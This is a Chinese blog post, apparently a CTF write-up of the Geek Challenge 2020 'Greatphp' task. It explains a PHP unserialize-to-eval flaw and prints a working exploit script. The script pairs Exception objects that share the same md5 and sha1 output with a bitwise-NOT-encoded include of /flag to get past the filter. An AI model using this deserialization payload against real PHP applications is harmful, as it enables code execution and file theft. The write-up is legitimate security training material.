---
title: '[极客大挑战 2020]Greatphp'
date: 2024-07-25 18:06:21
tags: php特性
categories: 刷题笔记
---

## [极客大挑战 2020]Greatphp（php内置类）

我们审计代码

```
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

一般来说，我们要绕过if语句的md5和sh1是用数组绕过的，但由于还要eval传递的值，所以我们就不能用数组绕过

所以，我们考虑php中的内置类，也就是原生类

<!--more-->

```
Error：用于PHP7、8，开启报错。

Exceotion：用于PHP5、7、8，开启报错。会自动调用__tostring
```

Error是所有php内部错误类的基类，该类是在php7.0.0中开始引入的

php7中，可以在echo时触发__tostring,来构造xss

所以我们可以使用含有\__tostring方法的php内置类来绕过，用的两个比较多的内置类 Exception 和 Error ，他们之中有一个 __toString 方法，当类被当做字符串处理时，就会调用这个函数

我们以Eror为例进行实验

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/45a0c9db33ceb334629e7946532f4d16.png)

我们发现以字符串形式输出了当前报错，包含当前报错信息以及当前报错的行号，而传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来

那怎么绕过md5和sha1

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7a9e09c63cfa997b6ce6593216a54845.png)

可见$a和\$b这两个对象本身是不同的，但是__tostring返回的结果是一样的，这里之所以要在一行，因为\_\_tostring返回的结果包含当前行号

Exception 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7

我们可以将题目代码中的 \$syc 和 $lover 分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码即可），但是 __toString 方法输出的结果相同即可

由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include "/flag" 将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过即可

构造pop链

```
<?php

class SYCLOVER {
    public $syc;
    public $lover;
    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
            if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
                eval($this->syc);
            } else {
                die("Try Hard !!");
            }

        }
    }
}

$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
/*
或使用[~(取反)][!%FF]的形式，
即: $str = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!.urldecode("%FF")."]?>";
 
$str = "?><?=include $_GET[_]?>";
*/
$a=new Exception($str,1);$b=new Exception($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));

?>

```

得到flag

![image-20240725184806934](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407251848190.png)
